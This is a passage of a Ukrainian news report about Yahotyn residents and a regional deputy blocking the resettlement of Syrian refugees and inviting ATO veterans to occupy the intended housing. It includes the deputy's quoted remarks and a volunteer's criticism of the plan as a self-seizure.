	<p>Переконані, що до пункту заселять сирійських біженців, тому вирішили, що діятимуть на випередження. Вони заслуговують на більше, ніж сирійці, вони захищають нашу батьківщину, а сирійці чомусь свою батьківщину захищать не хочуть — виїжджають», — зазначає в коментарі Радіо Свобода Армен Шахарьянц , депутат Київської обласної ради. Відповідне оголошення із запрошенням бійців АТО та їхніх сімей заселитися в ці приміщення Армен Шахарьянц розмістив у мережі Фейсбук, і воно швидко поширилось.</p>
<p>Депутат розповідає, що отримує чимало повідомлень про готовність людей приїхати і заселитись. Місцеві жителі вважають, що біженців можуть заселити вночі без погодження з громадою. Сьогодні не було приїжджих, були тільки два депутати облради: я і Микола Семеняка. Ми спитали думку народу, люди категорично проти, зібрались коло того центру й вирішили поставити блокпост, щоб ніхто не завіз іноземців, поки люди сплять. Щоб не поставили нас перед фактом, що люди там уже живуть. Тоді вже буде дуже погано», — розповідає Армен Шахарьянц.</p>
<p>Яготинці переконані, що мають право на такі дії, бо, за словами обласного депутата, з ними ніхто не погоджував проживання на території їхньої громади біженців. Місцева влада Яготина підтримує жителів у їхньому небажанні бачити у місті мігрантів, каже Армен Шахарьянц. Є в мережі і застережливі думки. Леся Литвинова , координатор «Волонтерського центру на Фроловській», реагуючи на цей заклик, висловилась, що, хоча і вважає несправедливим те, що відбувається, акція із заселенням, на її думку, є «самозахопленням».</p>
<p>Тому волонтер застерігає тих, хто має намір заселитися з дітьми у помешкання в такий спосіб.</p>
		
	<p>Народні віче та протести у Яготині раніше приїжджали підтримувати активісти цивільного корпусу «Азов» та «Правого сектору» з Києва. У нас критична ситуація в трьох регіонах: у Криму, Донецькій та Луганській областях. Чому ми маємо селити біженців з інших країн, якщо в нас не забезпечені житлом навіть свої переміщені особи?</p>
